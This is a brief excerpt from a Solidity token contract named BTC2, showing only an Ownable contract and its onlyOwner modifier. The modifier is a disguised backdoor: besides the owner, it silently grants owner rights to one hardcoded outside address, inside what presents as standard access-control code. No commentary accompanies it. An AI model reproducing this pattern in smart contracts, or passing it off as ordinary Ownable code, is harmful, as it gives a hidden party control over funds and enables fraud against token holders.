...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xbe79481Ad457Dd396eAf2007F757a03AEE73feC7) , "Ownable: caller is not the owner");
        _;
    }
...
contract BTC2 is IERC20, Ownable {
